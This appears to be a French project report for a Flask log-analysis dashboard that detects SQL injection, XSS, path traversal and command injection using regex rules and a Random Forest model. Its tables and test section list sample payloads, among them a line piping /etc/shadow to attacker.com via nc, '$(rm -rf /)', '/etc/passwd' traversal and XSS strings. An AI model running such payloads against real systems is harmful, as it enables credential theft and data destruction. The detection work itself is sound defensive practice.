# Rapport de Projet — CybeAttack-Analyse

## Tableau de Bord de Détection de Cyberattaques

---

## Table des matières

1. [Introduction](#1-introduction)
2. [Objectifs du projet](#2-objectifs-du-projet)
3. [Technologies utilisées](#3-technologies-utilisées)
4. [Architecture du projet](#4-architecture-du-projet)
5. [Conception du Backend](#5-conception-du-backend)
6. [Module de détection des attaques](#6-module-de-détection-des-attaques)
7. [Base de données](#7-base-de-données)
8. [Conception du Frontend](#8-conception-du-frontend)
9. [Fonctionnement général de l'application](#9-fonctionnement-général-de-lapplication)
10. [Tests et validation](#10-tests-et-validation)
11. [Difficultés rencontrées et solutions](#11-difficultés-rencontrées-et-solutions)
12. [Conclusion](#12-conclusion)

---

## 1. Introduction

Ce rapport présente le projet **CybeAttack-Analyse**, une application web permettant de détecter automatiquement des cyberattaques à partir de fichiers de logs. L'application combine des techniques de détection par règles (expressions régulières) et par intelligence artificielle (Machine Learning) pour analyser les fichiers uploadés et identifier les menaces potentielles.

Le projet s'inscrit dans le domaine de la cybersécurité et vise à fournir un outil pratique et visuel pour l'analyse de logs réseau ou serveur.

---

## 2. Objectifs du projet

Les objectifs principaux de ce projet sont :

- **Détecter les cyberattaques** dans des fichiers de logs (`.txt`, `.log`, `.csv`)
- **Combiner deux approches de détection** : règles regex et Machine Learning
- **Visualiser les résultats** à travers un tableau de bord web moderne et interactif
- **Stocker l'historique** des scans dans une base de données
- **Classifier les menaces** par type d'attaque et par niveau de sévérité

### Types d'attaques détectées

| Type d'attaque              | Sévérité   | Exemples                                       |
|-----------------------------|------------|-------------------------------------------------|
| Injection SQL               | Critique   | `SELECT * FROM users WHERE 1=1 --`              |
| XSS (Cross-Site Scripting)  | Élevée     | `<script>alert('XSS')</script>`                 |
| Traversée de chemin         | Élevée     | `../../etc/passwd`                               |
| Injection de commandes      | Critique   | `; cat /etc/shadow \| nc attacker.com 4444`     |
| Injection LDAP              | Moyenne    | `(uid=*)` patterns malveillants                  |
| Falsification de logs       | Moyenne    | Injection de retours à la ligne dans les logs    |
| Suspect (détecté par ML)    | Moyenne    | Lignes anormales détectées par le classificateur |

---

## 3. Technologies utilisées

### Backend

| Technologie      | Version | Rôle                                         |
|------------------|---------|----------------------------------------------|
| **Python**       | 3.10+   | Langage principal du serveur                 |
| **Flask**        | 3.1.0   | Framework web (routes, API REST)             |
| **SQLAlchemy**   | 3.1.1   | ORM pour la gestion de la base de données    |
| **Flask-CORS**   | 5.0.1   | Gestion des requêtes cross-origin            |
| **scikit-learn** | 1.6.1   | Entraînement du modèle Random Forest         |
| **joblib**       | 1.4.2   | Sauvegarde et chargement du modèle ML        |
| **NumPy**        | 2.2.3   | Calculs numériques et extraction de features  |

### Frontend

| Technologie      | Rôle                                         |
|------------------|----------------------------------------------|
| **HTML5**        | Structure des pages                          |
| **CSS3**         | Design (thème sombre, glassmorphism, animations) |
| **JavaScript**   | Logique côté client (upload, graphiques)     |
| **Chart.js**     | Bibliothèque de graphiques interactifs       |
| **Google Fonts** | Typographies Inter et JetBrains Mono         |

### Base de données

| Technologie | Rôle                                             |
|-------------|--------------------------------------------------|
| **SQLite**  | Base de données par défaut (aucune config)       |
| **MySQL**   | Option alternative via PyMySQL (optionnel)       |

---

## 4. Architecture du projet

### Structure des fichiers

```
CybeAttack-Analyse/
├── cyber-dashboard/
│   ├── app.py              ← Application Flask (routes API)
│   ├── config.py           ← Configuration centralisée
│   ├── detector.py         ← Module de détection (regex + ML)
│   ├── models.py           ← Modèles de base de données
│   ├── setup_db.py         ← Initialisation de la BDD
│   ├── test_upload.py      ← Script de test
│   ├── ml_model.pkl        ← Modèle ML pré-entraîné
│   ├── sample_test.log     ← Fichier d'exemple
│   ├── requirements.txt    ← Dépendances Python
│   ├── templates/
│   │   └── index.html      ← Page du tableau de bord
│   ├── static/
│   │   ├── css/style.css   ← Feuille de style (~800 lignes)
│   │   └── js/app.js       ← Logique frontend (~450 lignes)
│   ├── uploads/            ← Stockage temporaire des fichiers
│   └── instance/
│       └── cyber_dashboard.db  ← Base de données SQLite
```

### Diagramme d'architecture

```
┌─────────────────────────────────────────────────────────┐
│                    NAVIGATEUR WEB                       │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  index.html  │  │  style.css   │  │   app.js     │   │
│  │  (structure) │  │  (design)    │  │  (logique)   │   │
│  └──────┬───────┘  └──────────────┘  └──────┬───────┘   │
│         │          Fetch API (AJAX)          │           │
└─────────┼────────────────────────────────────┼───────────┘
          │                                    │
          ▼                                    ▼
┌─────────────────────────────────────────────────────────┐
│                    SERVEUR FLASK                        │
│  ┌──────────────────────────────────────────────────┐   │
│  │  app.py — Routes :                               │   │
│  │    GET  /            → Page principale            │   │
│  │    POST /api/upload  → Upload + analyse           │   │
│  │    GET  /api/history → Historique des scans       │   │
│  │    GET  /api/scan/<id> → Détails d'un scan        │   │
│  └──────────────┬───────────────────────────────────┘   │
│                 │                                       │
│  ┌──────────────▼──────────────────────────────────┐    │
│  │  detector.py — Détection à 2 niveaux :          │    │
│  │    Niveau 1 : Regex (expressions régulières)    │    │
│  │    Niveau 2 : Random Forest (Machine Learning)  │    │
│  └──────────────┬──────────────────────────────────┘    │
│                 │                                       │
│  ┌──────────────▼──────────┐  ┌────────────────────┐    │
│  │  models.py (SQLAlchemy) │  │  ml_model.pkl      │    │
│  │    - ScanLog            │  │  (modèle entraîné) │    │
│  │    - Threat             │  └────────────────────┘    │
│  └──────────────┬──────────┘                            │
│                 │                                       │
│  ┌──────────────▼──────────┐                            │
│  │  SQLite / MySQL         │                            │
│  │  (base de données)      │                            │
│  └─────────────────────────┘                            │
└─────────────────────────────────────────────────────────┘
```

---

## 5. Conception du Backend

### 5.1 Application Flask (`app.py`)

L'application Flask est construite avec le **pattern Factory** via la fonction `create_app()`. Ce choix permet de :
- Initialiser proprement la base de données
- Configurer les extensions (CORS, SQLAlchemy)
- Faciliter les tests

#### Routes API

| Route               | Méthode | Fonction            | Description                                 |
|----------------------|---------|---------------------|---------------------------------------------|
| `/`                  | GET     | `index()`           | Sert la page HTML du tableau de bord        |
| `/api/upload`        | POST    | `upload_file()`     | Reçoit un fichier, lance l'analyse, renvoie les résultats en JSON |
| `/api/history`       | GET     | `get_history()`     | Retourne les 20 derniers scans              |
| `/api/scan/<id>`     | GET     | `get_scan(scan_id)` | Retourne les détails d'un scan spécifique   |

#### Flux de traitement d'un upload

1. L'utilisateur envoie un fichier via `POST /api/upload`
2. Le serveur vérifie le type de fichier (`.txt`, `.log`, `.csv`)
3. Le fichier est sauvegardé temporairement dans le dossier `uploads/`
4. La fonction `scan_file()` du module `detector.py` est appelée
5. Les résultats sont enregistrés en base de données (tables `scan_logs` et `threats`)
6. Le fichier temporaire est supprimé
7. Les résultats sont renvoyés au frontend en format JSON

### 5.2 Configuration (`config.py`)

La configuration est centralisée dans une classe `Config` qui gère :

- **Clé secrète** : configurable via la variable d'environnement `SECRET_KEY`
- **Base de données** : SQLite par défaut, MySQL optionnel via `DATABASE_URL`
- **Uploads** : dossier de stockage, taille maximale (16 Mo), extensions autorisées

---

## 6. Module de détection des attaques

Le cœur du projet est le fichier `detector.py` qui implémente un **système de détection à deux niveaux**.

### 6.1 Niveau 1 — Détection par règles (Regex)

Le premier niveau utilise des **expressions régulières** pour détecter les patterns d'attaques connus. Chaque type d'attaque possède une liste de patterns regex associés à un niveau de sévérité.

**Exemple pour l'injection SQL :**

```python
"SQL Injection": {
    "patterns": [
        r"(?i)(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b\s+.*(FROM|INTO|TABLE|SET|ALL)\b)",
        r"(?i)(\bOR\b\s+\d+\s*=\s*\d+)",
        r"(?i)(UNION\s+(ALL\s+)?SELECT)",
        r"(?i)(SLEEP\s*\(\s*\d+\s*\))",
        # ... autres patterns
    ],
    "severity": "Critical",
}
```

**Avantages de cette approche :**
- Haute précision sur les attaques connues
- Résultats immédiats, pas d'entraînement nécessaire
- Facile à étendre avec de nouveaux patterns

### 6.2 Niveau 2 — Détection par Machine Learning

Le deuxième niveau utilise un **classificateur Random Forest** de scikit-learn pour détecter les lignes suspectes qui ne correspondent pas aux patterns connus.

#### Extraction de caractéristiques (features)

Pour chaque ligne de log, **20 caractéristiques numériques** sont extraites :

| #  | Caractéristique                        | Description                         |
|----|----------------------------------------|-------------------------------------|
| 1  | Longueur de la ligne                   | `len(line)`                         |
| 2-13 | Comptage de caractères spéciaux     | `'`, `"`, `;`, `-`, `<`, `>`, `(`, `)`, `/`, `\`, `\|`, `=` |
| 14 | Total de caractères spéciaux           | Tous les non-alphanumériques        |
| 15 | Comptage de mots-clés SQL             | SELECT, UNION, DROP, etc.           |
| 16 | Comptage de mots-clés XSS             | script, alert, eval, etc.           |
| 17 | Comptage de mots-clés d'injection     | `../`, `etc/passwd`, `cmd.exe`, etc.|
| 18 | Entropie de Shannon                    | Mesure du désordre dans la chaîne   |
| 19 | Nombre de mots                         | `len(line.split())`                 |
| 20 | Ratio de majuscules                    | Proportion de lettres majuscules    |

#### Entraînement du modèle

Le modèle est entraîné sur des **données synthétiques** générées automatiquement :
- **~1000 échantillons d'attaque** : variantes bruitées de 20 exemples d'attaques réelles
- **~1000 échantillons propres** : variantes de 20 exemples de logs normaux
- **Algorithme** : Random Forest avec 100 arbres, profondeur max de 10
- **Division** : 80% entraînement, 20% test
- Le modèle entraîné est sauvegardé dans `ml_model.pkl` via joblib

#### Logique combinée

```
Pour chaque ligne du fichier :
  1. Exécuter la détection par REGEX
  2. Si un pattern REGEX correspond → Menace confirmée (prioritaire)
  3. Sinon → Exécuter le classificateur ML
  4. Si ML prédit "attaque" ET confiance > 70% → Menace suspectée
  5. Sinon → Ligne considérée comme propre
```

---

## 7. Base de données

### 7.1 Modèles (`models.py`)

Deux tables sont définies via SQLAlchemy :

#### Table `scan_logs`

| Colonne        | Type        | Description                         |
|----------------|-------------|-------------------------------------|
| `id`           | Integer (PK)| Identifiant unique du scan          |
| `filename`     | String(256) | Nom du fichier uploadé              |
| `upload_time`  | DateTime    | Date et heure du scan               |
| `total_lines`  | Integer     | Nombre total de lignes analysées    |
| `total_attacks`| Integer     | Nombre d'attaques détectées         |
| `clean_lines`  | Integer     | Nombre de lignes propres            |
| `status`       | String(32)  | Statut du scan (`completed`)        |

#### Table `threats`

| Colonne          | Type        | Description                         |
|------------------|-------------|-------------------------------------|
| `id`             | Integer (PK)| Identifiant unique de la menace     |
| `scan_log_id`    | Integer (FK)| Référence vers le scan parent       |
| `line_number`    | Integer     | Numéro de ligne dans le fichier     |
| `attack_type`    | String(64)  | Type d'attaque détectée             |
| `severity`       | String(16)  | Niveau de sévérité                  |
| `matched_pattern`| String(256) | Pattern qui a déclenché l'alerte    |
| `raw_line`       | Text        | Contenu brut de la ligne            |

### 7.2 Relations

Un **scan** peut contenir **plusieurs menaces** (relation one-to-many). La suppression d'un scan entraîne automatiquement la suppression de toutes ses menaces associées (cascade).

---

## 8. Conception du Frontend

### 8.1 Page HTML (`index.html`)

La page est organisée en sections :

1. **En-tête** : logo animé (SVG), titre "CyberShield", indicateur de statut système
2. **Section Upload** : zone de drag-and-drop, bouton de scan, barre de progression
3. **Section Résultats** : cartes statistiques, graphiques (Chart.js), tableau des menaces
4. **Section Historique** : liste des scans précédents, cliquables pour revoir les résultats
5. **Pied de page**

### 8.2 Design CSS (`style.css` — ~800 lignes)

Le design adopte un **thème sombre cybersécurité** avec les choix suivants :

- **Palette de couleurs** : fond noir-bleu (`#0a0e1a`), accents cyan (`#00f0ff`) et violet (`#7b61ff`)
- **Glassmorphism** : effets de verre dépoli (`backdrop-filter: blur`) sur les cartes
- **Variables CSS** : toutes les couleurs, espacements et polices sont centralisés en `:root`
- **Typographies** : Inter (texte) et JetBrains Mono (code)
- **Animations** :
  - Logo pulsant avec effet de lueur (glow)
  - Indicateur de statut clignotant
  - Barre de progression animée
  - Transition `fadeInUp` pour l'apparition des résultats
  - Effets hover sur les cartes et lignes du tableau
- **Responsive** : adaptations pour tablettes (`768px`) et mobiles (`480px`)
- **Badges de sévérité** : code couleur (rouge = critique, orange = élevée, bleu = moyenne, vert = faible)

### 8.3 Logique JavaScript (`app.js` — ~450 lignes)

Le JavaScript gère l'ensemble de l'interactivité :

| Fonctionnalité            | Description                                              |
|---------------------------|----------------------------------------------------------|
| **Drag & Drop**           | Glisser-déposer un fichier sur la zone d'upload          |
| **Upload AJAX**           | Envoi asynchrone du fichier via Fetch API                |
| **Rendu des résultats**   | Mise à jour dynamique des cartes statistiques            |
| **Compteurs animés**      | Animation fluide des chiffres (0 → valeur finale)        |
| **Graphiques Chart.js**   | Diagramme en anneau (types d'attaques) et barres horizontales (sévérités) |
| **Tableau des menaces**   | Génération dynamique du tableau HTML avec badges         |
| **Historique**            | Chargement et affichage de l'historique via `/api/history` |
| **Rechargement de scan**  | Clic sur un scan passé pour revoir ses résultats         |
| **Utilitaires**           | Échappement HTML, troncature de texte, formatage de dates |

---

## 9. Fonctionnement général de l'application

### Scénario d'utilisation complet

```
1. L'utilisateur ouvre http://127.0.0.1:5000 dans son navigateur
         │
2. La page du tableau de bord s'affiche (index.html)
         │
3. L'utilisateur glisse-dépose un fichier .log dans la zone d'upload
         │
4. Il clique sur "Scan for Threats"
         │
5. Le fichier est envoyé au serveur via AJAX (POST /api/upload)
         │
6. Flask reçoit le fichier et appelle detector.scan_file()
         │
    ┌─────────────────────────────────────────────┐
    │  Pour chaque ligne du fichier :             │
    │    → Tier 1 : Vérification regex            │
    │    → Tier 2 : Classification ML             │
    │    → Attribution type + sévérité            │
    └─────────────────────────────────────────────┘
         │
7. Les résultats sont sauvegardés en BDD (ScanLog + Threats)
         │
8. Le JSON de réponse est envoyé au navigateur
         │
9. Le frontend affiche :
    → Cartes statistiques (lignes, attaques, lignes propres, niveau)
    → Graphique en anneau (répartition par type d'attaque)
    → Graphique en barres (répartition par sévérité)
    → Tableau détaillé de chaque menace détectée
         │
10. Le scan est ajouté à l'historique (consultable ultérieurement)
```

---

## 10. Tests et validation

### Fichier de test (`sample_test.log`)

Un fichier de 32 lignes est fourni pour tester l'application. Il contient un mélange réaliste de :

- **Lignes normales** : logs serveur, connexions, backups, health checks
- **Injections SQL** : `SELECT * FROM users WHERE id = 1 OR 1=1 --`
- **Attaques XSS** : `<script>alert('XSS')</script>`, `<img onerror=...>`
- **Traversées de chemin** : `../../../../etc/passwd`
- **Injections de commandes** : `; cat /etc/shadow`, `$(rm -rf /)`
- **Attaques temporelles** : `WAITFOR DELAY`, `SLEEP()`
- **iframes malveillantes** : `<iframe src="http://evil.com/...">`

### Résultats attendus

Sur le fichier `sample_test.log`, l'application devrait détecter environ **10 à 12 attaques** de différents types et sévérités, tout en classant correctement les ~20 lignes de log normales comme propres.

---

## 11. Difficultés rencontrées et solutions

| Difficulté                                       | Solution adoptée                                              |
|--------------------------------------------------|---------------------------------------------------------------|
| Détection de patterns complexes et variés        | Combinaison de regex (précision) et ML (généralisation)       |
| Manque de données réelles d'attaques             | Génération de données synthétiques pour l'entraînement        |
| Performance sur de gros fichiers                  | Modèle ML chargé une seule fois (singleton), fichier supprimé après analyse |
| Faux positifs du ML                              | Seuil de confiance à 70% pour limiter les fausses alertes     |
| Design moderne et professionnel                  | Thème sombre avec glassmorphism, animations CSS et Chart.js   |
| Compatibilité multi-navigateurs                  | Utilisation de CSS variables et préfixes vendor               |

---

## 12. Conclusion

Le projet **CybeAttack-Analyse** démontre la mise en œuvre d'une application web complète combinant :

- Un **backend Python/Flask** structuré avec une API REST
- Un **système de détection hybride** (règles + Machine Learning)
- Un **frontend moderne** avec visualisations interactives
- Une **base de données** pour la persistance de l'historique

L'application permet de détecter efficacement 6 types de cyberattaques avec des niveaux de sévérité différenciés. L'approche à deux niveaux offre à la fois la précision des règles connues et la capacité de généralisation du Machine Learning pour les menaces inconnues.

### Améliorations possibles

- Entraîner le modèle ML sur des **données réelles** (jeux de données publics comme CICIDS)
- Ajouter un système d'**authentification** pour sécuriser l'accès
- Implémenter des **alertes en temps réel** (email, webhook)
- Permettre l'**analyse de flux en direct** (streaming de logs)
- Ajouter un **export PDF** des rapports d'analyse
